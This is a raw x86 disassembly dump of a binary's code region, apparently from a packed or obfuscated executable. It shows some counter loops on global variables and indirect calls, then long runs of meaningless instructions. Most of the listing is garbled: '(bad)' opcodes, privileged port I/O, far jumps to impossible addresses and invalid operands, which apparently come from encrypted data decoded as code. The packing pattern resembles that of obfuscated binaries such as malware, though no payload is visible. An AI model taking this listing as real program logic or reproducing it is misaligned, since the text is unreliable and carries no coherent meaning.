  41992f:	mov    bh,BYTE PTR [esi-0x9]
  419932:	sub    BYTE PTR [ecx+0x51],bh
  419935:	push   ecx
  419936:	lock lods al,BYTE PTR ds:[esi]
  419938:	cmp    al,0xe2
  41993a:	repz gs sbb ebp,ecx
  41993e:	or     al,0x42
  419940:	aam    0x34
  419942:	pop    es
  419943:	mov    ebp,0x99624767
  419948:	js     0x419940
  41994a:	xor    BYTE PTR [edi+0x37],bl
  41994d:	mov    ch,0xa1
  41994f:	xor    ebx,edx
  419951:	xchg   DWORD PTR [esi],ebp
  419953:	adc    eax,0x32e5bfc2
  419958:	cmp    ebp,DWORD PTR [edi]
  41995a:	out    dx,al
  41995b:	aam    0x5e
  41995d:	out    0xa6,eax
  41995f:	repz mov ah,0x5e
  419962:	xor    ebp,ebx
  419964:	ds dec esp
  419966:	ds iret 
  419968:	jge    0x4199cf
  41996a:	rcl    DWORD PTR [ebp-0x4cba3045],0xdb
  419971:	sar    DWORD PTR [eax+0x26],0x85
  419975:	cs in  al,0x7f
  419978:	test   edx,edx
  41997a:	sbb    BYTE PTR [esi+0x7cd2fd64],0xd2
  419981:	std    
  419982:	inc    ebx
  419983:	inc    ebx
  419984:	mov    eax,ds:0xc08a2218
  419989:	or     dl,BYTE PTR [edi+ecx*2+0x42]
  41998d:	(bad)  
  41998e:	clc    
  41998f:	add    eax,0x6419d49a
  419994:	jb     0x419965
  419996:	adc    al,0x82
  419998:	sbb    esi,eax
  41999a:	mov    esi,0xa40400d7
  41999f:	push   edx
  4199a0:	sbb    al,cl
  4199a2:	out    dx,eax
  4199a3:	jle    0x4199e5
  4199a5:	aas    
  4199a6:	mov    ebp,0x66457e6b
  4199ab:	mov    eax,0xfae3cff
  4199b0:	jnp    0x419a20
  4199b2:	dec    ecx
  4199b3:	mov    ah,0x49
  4199b5:	jge    0x41998a
  4199b7:	push   0x3f
  4199b9:	mov    dl,0x82
  4199bb:	jmp    FWORD PTR [edx-0x28d4a147]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x36
  419b14:	adc    ebp,DWORD PTR ds:0x7fcfd0df
  419b1a:	js     0x419b2c
  419b1c:	jle    0x419b96
  419b1e:	js     0x419aaf
  419b20:	mov    WORD PTR [ebp+0x48527a27],?
  419b26:	pop    esi
  419b27:	sub    eax,0xf082ac43
  419b2c:	ins    DWORD PTR es:[edi],dx
  419b2d:	cdq    
  419b2e:	sbb    esi,edx
  419b30:	sbb    bh,bh
  419b32:	jmp    0xecf7:0x63f9740c
  419b39:	test   BYTE PTR ds:0x38b9c0b,0x8
  419b40:	add    ebp,DWORD PTR [ecx+0x76]
  419b43:	cmp    dh,ah
  419b45:	xchg   edi,eax
  419b46:	pop    ebp
  419b47:	sbb    al,al
  419b49:	jae    0x419ae7
  419b4b:	xor    BYTE PTR [esi],0x4a
  419b4e:	retf   0x30e4
  419b51:	xlat   BYTE PTR ds:[ebx]
  419b52:	stos   DWORD PTR es:[edi],eax
  419b53:	repnz fst DWORD PTR ds:0xac20ae50
  419b5a:	fcmovnb st,st(4)
  419b5c:	std    
  419b5d:	add    eax,0x674409a6
  419b62:	fsubr  QWORD PTR [esi-0x5aafee33]
  419b68:	adc    eax,0x34e9e18b
  419b6d:	pop    edx
  419b6e:	in     al,0xf
  419b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b71:	add    al,0xcf
  419b73:	push   es
  419b74:	mov    ch,0x56
  419b76:	clc    
  419b77:	push   es
  419b78:	add    eax,0x62f47d34
  419b7d:	xchg   esp,eax
  419b7e:	aaa    
  419b7f:	pop    ds
  419b80:	pusha  
  419b81:	adc    DWORD PTR [edx+0x39],esp
  419b84:	add    BYTE PTR [ebx-0x52],al
  419b87:	in     eax,0x1b
  419b89:	jg     0x419b81
  419b8b:	mov    esp,0x7725a7b
  419b90:	in     al,dx
  419b91:	pop    esp
  419b92:	mov    ch,0x82
  419b94:	jnp    0x419b4c
  419b96:	jne    0x419bb9
  419b98:	add    edi,edi
  419b9a:	or     ch,ah
  419b9c:	add    ebx,DWORD PTR [esi]
  419b9e:	mov    eax,ds:0xf1ab693b
  419ba3:	retf   
  419ba4:	add    eax,0x42eb126a
  419ba9:	jle    0x419b79
  419bab:	in     al,dx
  419bac:	not    DWORD PTR [edi+ecx*8-0x7d23dc8f]
  419bb3:	loopne 0x419b90
  419bb5:	dec    eax
  419bb6:	jb     0x419b82
  419bb8:	mov    ebp,esi
  419bba:	rol    edi,1
  419bbc:	jp     0x419be6
  419bbe:	nop
  419bbf:	sti    
  419bc0:	adc    eax,0xe2ce6788
  419bc5:	lea    esp,[edi-0x31]
  419bc8:	repz mov dl,0x21
  419bcb:	cld    
  419bcc:	mov    eax,0xbd8c80ce
  419bd1:	mov    ch,0x65
  419bd3:	loop   0x419c4d
  419bd5:	fisubr DWORD PTR [ebp-0x6cb6f451]
  419bdb:	xchg   ebp,eax
  419bdc:	int3   
  419bdd:	jno    0x419bf2
  419bdf:	jmp    0x7a7f:0xb62db1b7
  419be6:	push   ss
  419be7:	cmp    cl,ah
  419be9:	mov    ch,0xda
  419beb:	xchg   edx,eax
  419bec:	inc    ebp
  419bed:	fcomp  DWORD PTR [esi+0x1982cace]
  419bf3:	push   ebp
  419bf4:	aad    0xba
  419bf6:	das    
  419bf7:	sbb    ah,BYTE PTR [esi+0x10]
  419bfa:	adc    al,dl
  419bfc:	xchg   esi,eax
  419bfd:	mov    bl,0xcc
  419bff:	loope  0x419c76
  419c01:	inc    ebp
  419c02:	int3   
  419c03:	mov    DWORD PTR [edi-0x6f],edx
  419c06:	scas   al,BYTE PTR es:[edi]
  419c07:	loopne 0x419c5b
  419c09:	jg     0x419bd2
  419c0b:	and    edx,DWORD PTR [ebx+0x4c]
  419c0e:	loopne 0x419c7a
  419c10:	mov    ch,0x6e
  419c12:	sub    ebx,DWORD PTR [ebp+0x2e]
  419c15:	popf   
  419c16:	sub    DWORD PTR [edi],ecx
  419c18:	add    bl,BYTE PTR [ebx+0x61]
  419c1b:	adc    al,0x25
  419c1d:	xchg   ecx,eax
  419c1e:	int    0x37
  419c20:	int3   
  419c21:	ret    
  419c22:	test   DWORD PTR [ebp-0x4a],edx
  419c25:	bound  edi,QWORD PTR [ebx+edx*8]
  419c28:	xor    ebx,DWORD PTR [esi-0x59cbb5ef]
  419c2e:	in     eax,dx
  419c2f:	dec    esp
  419c30:	mov    ds:0x9f341879,eax
  419c35:	mov    ebx,0xade25093
  419c3a:	adc    eax,0x5ada3de
  419c3f:	and    ah,BYTE PTR [esi-0x7d]
  419c42:	mov    edi,0x73a9dc08
  419c47:	jae    0x419c1d
  419c49:	(bad)  
  419c4a:	jecxz  0x419c5a
  419c4c:	hlt    
  419c4d:	add    ebp,DWORD PTR [esi]
  419c4f:	lock cwd 
  419c52:	outs   dx,BYTE PTR ds:[esi]
  419c53:	fmul   DWORD PTR ds:0x3257631c
  419c59:	fisubr WORD PTR [ebp+0x18ae4153]
  419c5f:	jle    0x419c33
  419c61:	popa   
  419c62:	push   ebx
  419c63:	mov    cl,0x0
  419c66:	bound  ebp,QWORD PTR [edx+0x3]
  419c69:	imul   edi,DWORD PTR [ebp+0x46],0x23015402
  419c70:	jle    0x419c4f
  419c72:	add    DWORD PTR [eax],esi
  419c74:	jg     0x419ca3
  419c76:	dec    ebp
  419c77:	mov    edi,0xe1bc0c00
  419c7c:	mov    eax,0xd5aa22f5
  419c81:	das    
  419c82:	mov    dh,0xa1
  419c84:	push   esp
  419c85:	mov    cl,0x35
  419c87:	mov    ebp,DWORD PTR [edi+ebx*1+0x79]
  419c8b:	xchg   esi,eax
  419c8c:	jnp    0x419c95
  419c8e:	or     edx,DWORD PTR [ecx]
  419c90:	sub    dh,BYTE PTR [edi+0x49b12555]
  419c96:	(bad)  
  419c97:	fmul   QWORD PTR [edi-0x72]
  419c9a:	popa   
  419c9b:	push   esp
  419c9c:	pop    eax
  419c9d:	fcmovne st,st(7)
  419c9f:	inc    edx
  419ca0:	or     DWORD PTR [edx+0x68],ebp
  419ca3:	add    ah,BYTE PTR [ebx+0x1a]
  419ca6:	add    al,0x3e
  419ca8:	mov    ebx,0x19e2e984
  419cad:	mov    edx,0xbe087761
  419cb2:	sub    BYTE PTR [ebx],ch
  419cb4:	ja     0x419d1b
  419cb6:	dec    edi
  419cb7:	inc    ecx
  419cb8:	jno    0x419c6b
  419cba:	jl     0x419d00
  419cbc:	data16 ins BYTE PTR es:[edi],dx
  419cbe:	sbb    ecx,DWORD PTR [edi-0x6b]
  419cc1:	out    0x3e,al
  419cc3:	ret    
  419cc4:	push   0xffffffef
  419cc6:	scas   al,BYTE PTR es:[edi]
  419cc7:	lea    esi,[edx-0x313615be]
  419ccd:	(bad)  
  419cce:	ds stos DWORD PTR es:[edi],eax
  419cd0:	ror    BYTE PTR [edi],cl
  419cd2:	retf   0xa6dc
  419cd5:	jmp    0x6ac158a6
  419cda:	ss push edi
  419cdc:	mov    ch,0xe4
  419cde:	mov    DWORD PTR [ebx],ecx
  419ce0:	inc    ebp
  419ce1:	ss xchg ecx,eax
  419ce3:	sub    al,0xa1
  419ce5:	test   al,0xe6
  419ce7:	or     BYTE PTR [esi-0x39],0x90
  419ceb:	cli    
  419cec:	inc    ebx
  419ced:	lods   al,BYTE PTR ds:[esi]
  419cee:	inc    ebx
  419cef:	mov    ebp,0x7801cceb
  419cf4:	mov    ds:0xf9a6810d,eax
  419cf9:	inc    esp
  419cfa:	fcmovnu st,st(2)
  419cfc:	bound  esi,QWORD PTR [esi]
  419cfe:	cwd    
  419d00:	sub    eax,0x515d92d9
  419d05:	inc    esi
  419d06:	push   ebp
  419d07:	mov    al,BYTE PTR [ecx+esi*4-0x4be6ca35]
  419d0e:	inc    edx
  419d0f:	test   DWORD PTR [ebx],0x4129f7cd
  419d15:	fcomp  DWORD PTR [eax]
  419d17:	cmp    ebx,DWORD PTR [edx+0x791f5d32]
  419d1d:	mov    ds:0x653cd2f8,eax
  419d22:	sbb    al,0x16
  419d24:	(bad)  
  419d25:	stos   BYTE PTR es:[edi],al
  419d26:	test   DWORD PTR [edi],esi
  419d28:	arpl   WORD PTR [ecx-0x719ceca0],cx
  419d2e:	mov    DWORD PTR [edi],ecx
  419d30:	cmc    
  419d31:	add    BYTE PTR [ecx],al
  419d33:	pop    esi
  419d34:	stc    
  419d35:	jne    0x419d46
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	cmp    dh,BYTE PTR [edi+edi*1+0x5c]
  419d80:	call   0x10ba1d52
  419d85:	jle    0x419dff
  419d87:	js     0x419ddf
  419d89:	sar    DWORD PTR [ebp-0x7ba85087],0x34
  419d90:	cmp    ecx,DWORD PTR [eax+eax*8]
  419d93:	(bad)  
  419d94:	iret   
  419d95:	js     0x419d6c
  419d97:	mov    ss,WORD PTR [edx+esi*1]
  419d9a:	xor    al,0xff
  419d9c:	lahf   
  419d9d:	or     al,0x1b
  419da0:	fwait
  419da1:	xchg   esp,eax
  419da2:	jno    0x419d25
  419da4:	lds    esp,FWORD PTR [bp+si]
  419da7:	(bad)  
  419da9:	pop    es
  419daa:	test   BYTE PTR [eax+0x67],dh
  419dad:	addr16 push 0xfffffff2
  419db0:	mov    edi,0x764b45ba
  419db5:	popa   
  419db6:	xchg   BYTE PTR [edx+0x38],cl
  419db9:	xchg   DWORD PTR [esi],esi
  419dbb:	lods   al,BYTE PTR ds:[esi]
  419dbc:	jno    0x419d58
  419dbe:	in     eax,0x53
  419dc0:	mov    ebx,DWORD PTR [edx+0x548594ae]
  419dc6:	pop    edi
  419dc7:	leave  
  419dc8:	in     eax,dx
  419dc9:	mov    ds:0x3f7669b5,eax
  419dce:	pusha  
  419dcf:	out    0x7e,al
  419dd1:	(bad)  
  419dd3:	daa    
  419dd4:	jmp    0xcc82:0xc286
  419dda:	push   esi
  419ddb:	fisttp QWORD PTR [eax]
  419ddd:	pushf  
  419dde:	xchg   ecx,eax
  419ddf:	adc    bh,dl
  419de1:	hlt    
  419de2:	test   al,0x53
  419de4:	(bad)  
  419de5:	call   DWORD PTR [ecx+edx*4]
  419de8:	pop    ebp
  419de9:	addr16 test eax,0xbb5091b0
  419def:	retf   0xf7ed
  419df2:	test   BYTE PTR [edx+edi*2],dh
  419df5:	fidiv  WORD PTR [edi-0x7d]
  419df8:	or     BYTE PTR [ebx-0x5560b4ce],ah
  419dfe:	push   ss
  419dff:	mov    eax,0xab58beb5
  419e04:	lahf   
  419e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e06:	mov    ds:0xafc29507,al
  419e0b:	int3   
  419e0c:	xor    al,0x1a
  419e0e:	jbe    0x419e06
  419e10:	retf   
  419e11:	cli    
  419e12:	enter  0x9a12,0xeb
  419e16:	pop    es
  419e17:	inc    ecx
  419e18:	test   eax,0x3902ee18
  419e1d:	xchg   ecx,eax
  419e1e:	sar    BYTE PTR [ecx-0x1bfcbf20],0x83
  419e25:	dec    esp
  419e26:	xchg   DWORD PTR [ebx-0x1],edx
  419e29:	gs cs popa 
  419e2c:	cmp    eax,0xabf5b922
  419e31:	(bad)  
  419e32:	nop
  419e33:	jle    0x419ea3
  419e35:	retf   0x2dac
  419e38:	jae    0x419e0a
  419e3a:	push   edx
  419e3b:	clc    
  419e3c:	dec    edi
  419e3d:	inc    esi
  419e3e:	mov    ah,0x25
  419e40:	ret    
  419e41:	arpl   ax,dx
  419e43:	or     al,0xb9
  419e45:	popf   
  419e46:	sti    
  419e47:	push   ebx
  419e48:	test   eax,0x9ef8da74
  419e4d:	pushf  
  419e4e:	fsubr  QWORD PTR [edi]
  419e50:	mov    edx,0xe52f9544
  419e55:	popf   
  419e56:	adc    BYTE PTR [ebp+0x36d5c9d1],cl
  419e5c:	out    0xe4,al
  419e5e:	adc    dh,BYTE PTR [edx-0x19]
  419e61:	test   BYTE PTR ds:0xb6b92947,0xb4
  419e68:	mov    ebx,0x2e882ca5
  419e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e6e:	xlat   BYTE PTR ds:[ebx]
  419e6f:	shl    DWORD PTR [ecx+0x10],0x3d
  419e73:	fwait
  419e74:	adc    eax,DWORD PTR [edi-0x1d]
  419e77:	inc    esp
  419e78:	into   
  419e79:	mov    eax,0x78980185
  419e7e:	repnz in eax,dx
  419e80:	aaa    
  419e81:	xchg   ecx,eax
  419e82:	cmp    eax,0xd0b3ac10
  419e87:	cmp    BYTE PTR [esi+ebp*2-0x6f],cl
  419e8b:	jae    0x419e9c
  419e8d:	addr16 loope 0x419e71
  419e90:	ins    DWORD PTR es:[edi],dx
  419e91:	jmp    0x24f6cb9c
  419e96:	xor    DWORD PTR [ebp+0x22],edi
  419e99:	shl    ah,0x83
  419e9c:	mov    ss,WORD PTR [ebx-0x66]
  419e9f:	hlt    
  419ea0:	jmp    0x9a8ebdd2
  419ea5:	cmp    BYTE PTR ds:0x754c8d96,bh
  419eab:	mov    cl,0x70
  419ead:	add    BYTE PTR [eax+esi*4-0x23653e0c],bl
  419eb4:	mov    ds:0x7b3235ad,eax
  419eb9:	stos   DWORD PTR es:[edi],eax
  419eba:	jmp    0x419f38
  419ebc:	ret    0xbd2b
  419ebf:	add    al,0x3
  419ec1:	sbb    edi,DWORD PTR [esp+edi*1-0x45]
  419ec5:	ret    0x6893
  419ec8:	inc    edx
  419ec9:	pushf  
  419eca:	xchg   ebx,eax
  419ecb:	loope  0x419f35
  419ecd:	xor    eax,0xc50380ab
  419ed2:	mov    ?,WORD PTR ss:[eax+0x62]
  419ed6:	mov    dh,bl
  419ed8:	mov    esi,0xd1808d8
  419edd:	lds    esi,FWORD PTR [edi-0x1cff413f]
  419ee3:	into   
  419ee4:	cmp    BYTE PTR ds:0xca1b5480,cl
  419eea:	fist   WORD PTR [edx]
  419eec:	(bad)
  419eef:	dec    eax
  419ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef1:	cmp    dl,BYTE PTR [edi-0x327f3ed6]
  419ef7:	call   0xb15a:0x8f7ef2d3
  419efe:	ret    
  419eff:	jo     0x419f16
  419f01:	pop    esi
  419f02:	std    
  419f03:	ds (bad) 
  419f05:	stos   DWORD PTR es:[edi],eax
  419f06:	or     ebp,DWORD PTR [ecx+ecx*8]
  419f09:	push   ebp
  419f0a:	enter  0x3f77,0x8f
  419f0e:	push   ss
  419f0f:	aad    0xf1
  419f11:	mov    cs,ebp
  419f13:	or     eax,0xa13c6130
  419f18:	mov    dh,0x5f
  419f1a:	dec    ecx
  419f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f1c:	popa   
  419f1d:	pop    ebp
  419f1e:	into   
  419f1f:	sar    DWORD PTR [ebp+0x21],cl
  419f22:	sbb    DWORD PTR [edi],edx
  419f24:	daa    
  419f25:	fldenv [ebx-0x61d0cedb]
  419f2b:	shl    BYTE PTR [eax+ecx*2+0x56d39466],1
  419f32:	add    dh,BYTE PTR [esi+0x50e5ae7d]
  419f38:	loopne 0x419efa
  419f3a:	test   BYTE PTR [ebp+0x2a213110],bh
  419f40:	or     edi,DWORD PTR [ebp-0x24]
  419f43:	call   DWORD PTR [edx-0x52156fa]
  419f49:	sbb    DWORD PTR [ebp+0x1e],esi
  419f4c:	push   cs
  419f4d:	xor    ebp,eax
  419f4f:	mov    dl,0xfd
  419f51:	retf   
  419f52:	sbb    al,0xbc
  419f54:	inc    edx
  419f55:	adc    BYTE PTR [ebx+0x60],al
  419f58:	mov    ah,0xf7
  419f5a:	pop    ds
  419f5b:	(bad)  
  419f5c:	xchg   esi,eax
  419f5d:	or     BYTE PTR [eax],ah
  419f5f:	ret    0xb4df
  419f62:	cli    
  419f63:	inc    edx
  419f64:	add    DWORD PTR [edx],edi
  419f66:	test   BYTE PTR [ebx],0xe7
  419f69:	push   esp
  419f6a:	ret    
  419f6b:	mov    ds,WORD PTR [edx+0x44635239]
  419f71:	mov    ebp,0xbd9af535
  419f76:	mov    ah,0xdb
  419f78:	scas   eax,DWORD PTR es:[edi]
  419f79:	cmp    DWORD PTR [edi+0x5ba6f98f],eax
  419f7f:	and    eax,0x82084eaa
  419f84:	xlat   BYTE PTR ds:[ebx]
  419f85:	sub    eax,0xdd6815cd
  419f8a:	ins    DWORD PTR es:[edi],dx
  419f8b:	fwait
  419f8c:	dec    edx
  419f8d:	cwde   
  419f8e:	jle    0x419ff2
  419f90:	jle    0x419f95
  419f92:	push   esi
  419f93:	or     edx,DWORD PTR [ebx+0x9]
  419f96:	add    bh,0x5c
  419f99:	fninit 
  419f9b:	mov    ecx,DWORD PTR [esi]
  419f9d:	pop    eax
  419f9e:	addr16 pop esp
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42a7c5,0x42a761
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0xfa
  419fdd:	mov    eax,ds:0xd3800796
  419fe2:	jg     0x41a05c
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x419f84
  419fe9:	and    edx,DWORD PTR [ebx+0x28]
  419fec:	cmp    dl,ah
  419fee:	pop    ecx
  419fef:	or     DWORD PTR [eax],eax
  419ff1:	iret   
  419ff2:	ins    DWORD PTR es:[edi],dx
  419ff3:	xor    al,0x48
  419ff5:	xchg   edi,eax
  419ff6:	data16 js 0x419f7e
  419ff9:	inc    esi
  419ffa:	mov    edi,0x60ba204f
  419fff:	cdq    
  41a000:	dec    esp
  41a001:	pop    edx
  41a002:	and    al,0x9f
  41a004:	mov    cl,0xd5
  41a006:	sbb    DWORD PTR [ebx+0x18b9e0d4],ebp
  41a00c:	mov    esp,0x595f237
  41a011:	gs pop ss
  41a013:	cmc    
  41a014:	cmp    eax,ebp
  41a016:	dec    eax
  41a017:	out    dx,al
  41a018:	sub    dl,BYTE PTR [edx+0x56]
  41a01b:	out    dx,al
  41a01c:	mov    esp,DWORD PTR [ebx+0x431bbc26]
  41a022:	mov    dh,0xaa
  41a024:	(bad)  
  41a026:	js     0x41a0a4
  41a028:	mov    al,0xe2
  41a02a:	cmp    al,BYTE PTR [ebx+0x18aa6be5]
  41a030:	leave  
  41a031:	push   edx
  41a032:	enter  0x1f3a,0xda
  41a036:	or     al,0x47
  41a038:	push   ecx
  41a039:	jnp    0x41a02f
  41a03b:	jp     0x419ffb
  41a03d:	in     al,dx
  41a03e:	jle    0x7e50fdd9
  41a044:	out    0x93,eax
  41a046:	dec    ecx
  41a047:	mov    ecx,0xdd5b8cec
  41a04c:	jg     0x41a024
  41a04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a04f:	and    dl,al
  41a051:	pop    edi
  41a052:	jo     0x41a011
  41a054:	imul   eax,esi,0x3df0cdb6
  41a05a:	mov    esi,0x666a673b
  41a05f:	aas    
  41a060:	sbb    ah,BYTE PTR [edx+eax*2-0x45a305d5]
  41a067:	in     al,dx
  41a068:	dec    edi
  41a069:	lds    eax,FWORD PTR [eax]
  41a06b:	imul   eax,DWORD PTR [ecx+0x57],0xffffffa8
  41a06f:	mov    esp,0xa1f521a3
  41a074:	les    edx,FWORD PTR [eax+edx*1-0x68]
  41a078:	push   esi
  41a079:	adc    al,0x86
  41a07b:	es push 0x27a3cada
  41a081:	mov    ecx,0xf53b323c
  41a086:	imul   ebp,DWORD PTR [ebx],0xffffffb0
  41a089:	popa   
  41a08a:	inc    ebx
  41a08b:	int    0xdd
  41a08d:	push   0x71
  41a08f:	jmp    0xb81be3ad
  41a094:	pusha  
  41a095:	pop    ebp
  41a096:	mov    BYTE PTR [edx-0x4644e6a5],ah
  41a09c:	mov    edi,0x546ed49c
  41a0a1:	xchg   al,al
  41a0a3:	mov    BYTE PTR [eax],cl
  41a0a5:	ret    0x29e0
  41a0a8:	fs cmc 
  41a0aa:	jecxz  0x41a038
  41a0ac:	inc    ebx
  41a0ad:	loop   0x41a049
  41a0af:	jns    0x41a119
  41a0b1:	jmp    0xd39f:0x245aa891
  41a0b8:	loopne 0x41a053
  41a0ba:	xchg   BYTE PTR [ebx-0x34],al
  41a0bd:	shl    DWORD PTR [edx-0x53],0x5
  41a0c1:	inc    esi
  41a0c2:	fimul  WORD PTR [edi+eax*8]
  41a0c5:	xchg   esp,eax
  41a0c6:	(bad)  
  41a0c7:	(bad)  
  41a0c8:	and    ecx,DWORD PTR [ebx+0xd]
  41a0cb:	pop    edx
  41a0cc:	mov    ah,BYTE PTR [eax-0x14]
  41a0cf:	or     ecx,eax
  41a0d1:	jae    0x41a0d4
  41a0d3:	mov    cl,0x1e
  41a0d5:	lahf   
  41a0d6:	aad    0x4e
  41a0d8:	(bad)  
  41a0d9:	fnstsw WORD PTR [esi+0x79bd432d]
  41a0df:	adc    al,0xb2
  41a0e1:	dec    edi
  41a0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e3:	retf   
  41a0e4:	imul   esi,DWORD PTR [edi-0x34],0xb6c05dbc
  41a0eb:	push   edx
  41a0ec:	xchg   ecx,eax
  41a0ed:	or     bh,BYTE PTR [edi+0x55]
  41a0f0:	push   0xffffffb3
  41a0f2:	pushf  
  41a0f3:	cwde   
  41a0f4:	add    eax,0x8082140e
  41a0f9:	test   eax,0x8cae8bfe
  41a0fe:	sbb    cl,BYTE PTR [edi]
  41a100:	push   edx
  41a101:	or     DWORD PTR [esi+0x17be66c9],0x7af85cf7
  41a10b:	xchg   esi,eax
  41a10c:	stos   DWORD PTR es:[edi],eax
  41a10d:	dec    ebx
  41a10e:	(bad)  
  41a110:	shl    BYTE PTR [eax-0x67281d10],1
  41a116:	js     0x41a142
  41a118:	es test eax,0x82c8060f
  41a11e:	mov    bl,0x31
  41a120:	loope  0x41a0f7
  41a122:	inc    eax
  41a123:	dec    ebp
  41a124:	jbe    0x41a0f9
  41a126:	inc    edi
  41a127:	xor    al,0x4f
  41a129:	retf   
  41a12a:	clc    
  41a12b:	xchg   DWORD PTR [edi-0x47],edx
  41a12e:	imul   edi,DWORD PTR [eax+ecx*2],0xf9f52dfa
  41a135:	into   
  41a136:	pop    edx
  41a137:	bound  esi,QWORD PTR [eax-0x4b9e22c4]
  41a13d:	int    0xc4
  41a13f:	add    ch,BYTE PTR [ebx+0x31d5d788]
  41a145:	jne    0x41a0d5
  41a147:	mov    al,ds:0xa6824463
  41a14c:	jns    0x41a0ce
  41a14e:	das    
  41a14f:	adc    ch,dl
  41a151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a152:	iret   
  41a153:	sbb    eax,0xa3cf6931
  41a158:	pop    ebp
  41a159:	lods   eax,DWORD PTR ds:[esi]
  41a15a:	cmp    ch,ch
  41a15c:	lds    ecx,FWORD PTR [eax+0x2962cdac]
  41a162:	iret   
  41a163:	jge    0x41a104
  41a165:	inc    edi
  41a166:	mov    BYTE PTR [esi-0x42],dh
  41a169:	mov    edx,DWORD PTR [edi-0x68e9756a]
  41a16f:	out    0x5f,eax
  41a171:	mov    al,0xa7
  41a173:	nop
  41a174:	and    esi,DWORD PTR [esi+0x2e]
  41a177:	cwde   
  41a178:	fsubr  DWORD PTR [esi]
  41a17a:	adc    cl,0x86
  41a17d:	test   esi,edi
  41a17f:	(bad)  
  41a180:	or     eax,0x5cc23033
  41a185:	xchg   edx,eax
  41a186:	xor    DWORD PTR ds:0x7e5defdc,esp
  41a18c:	jge    0x41a141
  41a18e:	xor    al,0x60
  41a190:	aad    0x71
  41a192:	mov    ebp,0xe18f3dd0
  41a197:	int3   
  41a198:	jo     0x41a12a
  41a19a:	(bad)  
  41a19c:	mov    eax,ds:0x5fea2498
  41a1a1:	add    DWORD PTR [ebx],edi
  41a1a3:	sbb    ah,BYTE PTR [esi]
